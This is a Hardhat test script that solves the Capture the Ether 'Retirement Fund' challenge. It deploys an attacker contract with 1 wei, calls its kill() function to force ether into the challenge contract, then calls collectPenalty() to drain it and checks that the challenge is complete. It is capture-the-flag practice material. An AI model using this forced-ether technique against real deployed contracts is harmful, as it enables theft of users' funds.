import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    RetirementFundChallenge,
    RetirementAttacker,
    RetirementAttacker__factory,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { BigNumber, Signer, Wallet } from "ethers"
import "dotenv/config"

describe("Retirement challenge", function () {
    let attacker: Wallet
    let target: RetirementFundChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x0bb0Cb4190677475D114B2F85841f04E994e675D"
        attacker = new Wallet(
            process.env.METAMASK_PRIVATE_KEY!,
            ethers.provider
        )
        target = await ethers.getContractAt(
            "RetirementFundChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Attacking and draining contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum
        const attackerFactory: RetirementAttacker__factory =
            await ethers.getContractFactory("RetirementAttacker")
        const attackerContract: RetirementAttacker = await (
            await attackerFactory.deploy(target.address, { value: 1 })
        ).connect(attacker)
        console.log(`Attacker deployed at: ${attackerContract.address}`)

        tx = await attackerContract.kill()
        await tx.wait(1)

        const startBal = BigNumber.from(
            await ethers.provider.getStorageAt(target.address, 0)
        )
        console.log(`Start balance: ${startBal.toString()}`)
        console.log(
            `Balance after attack: ${await ethers.provider.getBalance(
                target.address
            )}`
        )

        tx = await target.collectPenalty()
        await tx.wait(1)
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
